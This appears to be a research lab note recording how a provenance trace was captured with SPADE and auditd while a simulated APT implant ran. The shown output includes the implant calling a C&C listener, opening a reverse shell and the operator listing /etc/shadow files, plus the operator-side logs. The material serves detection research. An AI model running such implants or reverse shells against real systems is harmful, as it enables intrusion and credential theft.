Trace was obtained by running these commands on the Monitored Host:

1. `./1_run_simple_apt.sh`
2. `date; /tmp/simple 13.1.102.2 4000`
3. `date; sudo spade stop`
4. `rsync -av /tmp/simple_apt.cdm adapt@seaside.galois.com:trace/2016-08-11/simple_with_marker_3.avro`

sample output
=============

    Script started on Thu 11 Aug 2016 11:39:34 AM PDT
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ ./run_simple_apt.sh
    Running on unusual Monitored Host. Proceding...
    /tmp/simple 13.1.102.2 4000

    + sudo auditctl -a exit,always -F arch=b64 -S socket -S bind -S listen -S accept
    + sudo auditctl -l -a always,exit -F arch=x86_64 -S socket,accept,bind,listen
    + sudo auditctl -b 8000
    enabled 1
    flag 1
    pid 529
    rate_limit 0
    backlog_limit 8000
    lost 0
    backlog 0

    + sudo spade start
    + exit 0
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ Starting SPADE as a daemon with PID: 13259

    hangang:~/adapt/classifier/phase3/marker/monitored-host$ spade control

    SPADE 2.0 Control Client

    Available commands:
    	add reporter|storage <class name> <arguments>
    	add filter|transformer <class name> position=<number> <arguments>
    	add sketch <class name>
    	remove reporter|storage|sketch <class name>
    	remove filter|transformer <position number>
    	list reporters|storages|filters|sketches|transformers|all
    	config load|save <filename>
    	exit

    -> list all
    No reporters added
    No storages added
    No filters added
    No transformers added
    No sketches added

    -> add storage CDM output=/tmp/simple_apt.cdm
    Adding storage CDM... done

    -> add reporter Audit arch=64 units=false fileIO=true netIO=true
    Adding reporter Audit... done

    -> list all
    1 reporter(s) added:
    	1. Audit (arch=64 units=false fileIO=true netIO=true)
    1 storage(s) added:
    	1. CDM (output=/tmp/simple_apt.cdm)
    No filters added
    No transformers added
    No sketches added

    -> exit
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ sudo auditctl -s
    enabled 1
    flag 1
    pid 529
    rate_limit 0
    backlog_limit 8000
    lost 0
    backlog 1126
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ /tmp/simple 13.1.102.2 4000
    [*] Target: 13.1.102.2:4000
    [*] Initializing message subsystem
    [*] Initializing network
    [*] Initializing session
    [*] Starting session
    [*] Getting OS information...
    [*] Linux #1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29) (3.16.0-4-amd64)
    [*] Encoding message
    [*] Encoding new connection info message
    [*] Sending message of 80 bytes (1 chunks)
    [*] Sending data: 95 bytes
    [*] Sent chunk of 95 bytes
    [*] Sent total message of 80 bytes
    [*] Sent 80 bytes
    [*] Creating message loop thread...
    [*] Starting message receive loop...
    [*] Entering C&C message processing loop...
    [*] Received 24 bytes
    [*] Allocating 24 bytes for pMsg
    [*] Destroying message list 1
    [*] Received message type 210 (9 bytes)
    [*] Decoding Shell Request message
    [*] Creating message type 210 handler thread...
    [*] shell_start
    [+] Shell session connecting to listener at 13.1.102.2:40000
    [+] Shell session connected to listener at 13.1.102.2:40000
    [*] Child exited with status 0
    [*] Exiting message receive loop
    [*] Session is not connected
    [*] Ending session
    [*] Cleaning up network
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ time sudo spade stop
    SPADE daemon will stop after buffers clear.

    real	0m1.500s
    user	0m0.448s
    sys	0m0.056s
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ sudo auditctl -s
    enabled 1
    flag 1
    pid 529
    rate_limit 0
    backlog_limit 8000
    lost 0
    backlog 0
    hangang:~/adapt/classifier/phase3/marker/monitored-host$ exec ls -l /tmp/simple_apt.cdm
    -rw-r--r-- 1 root root 359569 Aug 11 11:41 /tmp/simple_apt.cdm

    Script done on Thu 11 Aug 2016 11:41:43 AM PDT


corresponding session in Shanghai
---------------------------------

    galaxy1:~/Documents/TransparentComputing/malware/cross-platform/simple-apt/oc1$  python ocMain.py 13.1.102.2 4000
    [*] Listening for new connections on 13.1.102.2:4000
    MAIN>[*] Connected with 13.1.101.46:53951
    [*] Initialized message multiplexor
    [*] New console information
    [*] =======================
    [*] 	Linux
    [*] 	#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29)
    [*] 	3.16.0-4-amd64
    [*] New Linux console: L1
    .
    MAIN>console L1
    L1>shell ls -l /etc/shadow*
    .
    <<< New shell child process 8633 created.  Use 'exit' to exit or CTRL-C to reset shell >>>
    -rw-r----- 1 root shadow 1563 Feb 11 13:27 /etc/shadow
    -rw------- 1 root root   1563 Feb 11 13:27 /etc/shadow-
    -rw-r----- 1 root shadow 1534 Feb 11 13:01 /etc/shadow.org
    [*] Script complete, exiting shell...
    L1>quit
    MAIN>[*] Lost connection to client
    [*] Exiting session...
    [*] Exiting client thread

    MAIN>galaxy1:~/Documents/TransparentComputing/malware/cross-platform/simple-apt/oc1$


logs retained by Unit 61398
---------------------------

    galaxy1:~/Documents/TransparentComputing/malware/cross-platform/simple-apt/oc1$  head -99 logs/20160811_112857/*.log
    ==> logs/20160811_112857/L1.log <==
    2016-08-11 11:40:33,114   ocConsoleBase:028 [DEBUG] Created log for new console L1
    2016-08-11 11:40:44,460 ocConsoleSubBase:039 [DEBUG] CMD: shell ls -l /etc/shadow*
    2016-08-11 11:40:44,587 ocConsoleSubBase:199 [DEBUG] SCRIPT: ls -l /etc/shadow*; exit


    <<< New shell child process 8633 created.  Use 'exit' to exit or CTRL-C to reset shell >>>

    -rw-r----- 1 root shadow 1563 Feb 11 13:27 /etc/shadow
    -rw------- 1 root root   1563 Feb 11 13:27 /etc/shadow-
    -rw-r----- 1 root shadow 1534 Feb 11 13:01 /etc/shadow.org

    2016-08-11 11:40:54,600 ocConsoleSubBase:233 [ INFO] Script complete, exiting shell...
    2016-08-11 11:40:56,599 ocConsoleSubBase:039 [DEBUG] CMD: quit
    2016-08-11 11:40:56,668   ocConsoleBase:081 [ INFO] Exiting client thread

    ==> logs/20160811_112857/main.log <==
    2016-08-11 11:28:57,289   ocConsoleBase:028 [DEBUG] Created log for new console None
    2016-08-11 11:28:57,289   ocConsoleBase:031 [DEBUG] ------ ConsoleMain ---------
    2016-08-11 11:28:57,290   ocConsoleBase:032 [DEBUG] 	module name: ocConsoleBase
    2016-08-11 11:28:57,290   ocConsoleBase:034 [DEBUG] 	parent process: 32398
    2016-08-11 11:28:57,290   ocConsoleBase:035 [DEBUG] 	process id: 8498
    2016-08-11 11:28:57,290  ocSocketServer:021 [DEBUG] Initializing socket server
    2016-08-11 11:28:57,290  ocSocketServer:040 [ INFO] Listening for new connections on 13.1.102.2:4000
    2016-08-11 11:40:33,054  ocSocketServer:047 [ INFO] Connected with 13.1.101.46:53951
    2016-08-11 11:40:33,110           ocMux:060 [ INFO] Initialized message multiplexor
    2016-08-11 11:40:33,110  ocSocketServer:086 [ INFO] New console information
    2016-08-11 11:40:33,110  ocSocketServer:087 [ INFO] =======================
    2016-08-11 11:40:33,111  ocSocketServer:089 [ INFO] 	Linux
    2016-08-11 11:40:33,111  ocSocketServer:091 [ INFO] 	#1 SMP Debian 3.16.7-ckt20-1+deb8u4 (2016-02-29)
    2016-08-11 11:40:33,111  ocSocketServer:093 [ INFO] 	3.16.0-4-amd64
    2016-08-11 11:40:33,111   ocConsoleMain:231 [ INFO] New Linux console: L1
    2016-08-11 11:40:33,115           ocMux:142 [DEBUG] [1000] Received 1/1 (95 bytes)
    .
    2016-08-11 11:40:39,386   ocConsoleMain:137 [DEBUG] Command: console [L1]
    2016-08-11 11:40:44,486           ocMux:074 [DEBUG] Sending message of 1 chunks...
    2016-08-11 11:40:56,599           ocMux:133 [ INFO] Lost connection to client
    2016-08-11 11:40:56,599           ocMux:134 [ INFO] Exiting session...
    galaxy1:~/Documents/TransparentComputing/malware/cross-platform/simple-apt/oc1$
